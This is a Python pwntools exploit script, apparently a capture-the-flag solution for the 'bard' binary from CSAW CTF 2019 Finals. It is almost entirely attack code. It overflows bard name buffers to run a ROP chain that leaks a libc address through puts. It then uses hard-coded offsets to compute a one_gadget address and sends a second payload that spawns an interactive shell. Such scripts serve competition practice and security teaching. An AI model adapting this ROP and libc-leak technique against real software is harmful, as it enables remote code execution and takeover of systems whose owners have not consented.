# exploit-bard.py
# by N4T_20

from pwn import *
from time import sleep

local = False
debug = False

if local:
    if debug:
        p = gdb.debug('/home/ctf/Documents/OSIRIS/testing/bardsfailtest/bard', '''
            break *0x400f96
            break *0x401065
            break *0x401079
            continue
            ''')
        # 0x401079: checking first return to the ROP chain
#        p = gdb.debug('/home/ctf/Documents/NYUSEC/CSAW-CTF-2019-Finals/pwn/thebardsfail/bard', '''
#            break *0x400f96
#            break *0x401065
#            continue
#            ''')
    else:
        #p = process('/home/ctf/Documents/NYUSEC/CSAW-CTF-2019-Finals/pwn/thebardsfail/bard')
        p = process('/home/ctf/Documents/OSIRIS/testing/bardsfailtest/bard')
else:
    #p = process('/home/ctf/Documents/NYUSEC/CSAW-CTF-2019-Finals/pwn/thebardsfail/bard_remote')
    p = remote('localhost', 8000)

PRINTF_ADDR = 0x602030 # 0x602028
GETCHAR_ADDR = 0x602048
POP_RDI_ADDR = 0x401143 # 0x401143
PUTS_ADDR = 0x401091 # 0x400f8c # 0x4010b0
RET_ADDR = 0x4006ae # 0x400606
# 0x4010b0: main...

def choose_good_bard(name):
    p.send("g\n")
    p.recvuntil("accuracy\n")
    p.send("1\n")
    p.recvuntil("name:\n")
    p.send(name + "\n")

def choose_evil_bard(name):
    p.send("e\n")
    p.recvuntil("disappointment\n")
    p.send("1\n")
    p.recvuntil("name:\n")
    p.send(name + "\n")

p.recvuntil("evil):\n")
choose_good_bard(chr(0x41))
p.recvuntil("evil):\n")

for i in range(7):
    choose_evil_bard(chr(0x41+i+1)*31)
    p.recvuntil("evil):\n")

# bard with a shorter name
choose_evil_bard(chr(0x41+8)*26)
p.recvuntil("evil):\n")

payload = p64(POP_RDI_ADDR)
payload += p64(GETCHAR_ADDR) # p64(PRINTF_ADDR) # GETCHAR_ADDR
payload += p64(PUTS_ADDR)

choose_good_bard(payload)
p.recvuntil("(r)un\n")
for i in range(9):
    p.send("r\n")
    p.recvuntil("(r)un\n")

p.send("r\n")
p.recvuntil("away.\n")
# Next address is a libc address, leaked
#GETCHAR_ADDR = p.recv(6) + "\x00\x00"
LIBC_ADDR = p.recv(6) + "\x00\x00"

GETCHAR_ADDR = u64(LIBC_ADDR)
if local:
    GETCHAR_OFFSET = 0x87f70 # 0x64e80
    ONE_GADGET_OFFSET = 0x10a45c # 0x10a38c
else:
    GETCHAR_OFFSET = 0x87f70 # 0x64e80
    ONE_GADGET_OFFSET = 0x10a45c # 0x10a38c

#ONE_GADGET_ADDR = PRINTF_ADDR - PRINTF_OFFSET + ONE_GADGET_OFFSET
ONE_GADGET_ADDR = GETCHAR_ADDR - GETCHAR_OFFSET + ONE_GADGET_OFFSET

print("one gadget address is at " + hex(ONE_GADGET_ADDR))

## Second round!
p.recvuntil("evil):\n")
choose_good_bard(chr(0x41))
p.recvuntil("evil):\n")

for i in range(7):
    choose_evil_bard(chr(0x41+i+1)*31)
    p.recvuntil("evil):\n")

# bard with a shorter name
choose_evil_bard(chr(0x41+8)*26)
p.recvuntil("evil):\n")

payload2 = p64(RET_ADDR)
payload2 += p64(RET_ADDR)
payload2 += p64(ONE_GADGET_ADDR)
#payload += p64(PRINTF_ADDR)
#payload += p64(PUTS_ADDR)

choose_good_bard(payload2)
p.recvuntil("(r)un\n")


for i in range(9):
    p.send("r\n")
    p.recvuntil("(r)un\n")

p.send("r\n")

# Still have to type "r\n" to get the shell at this point
p.interactive()




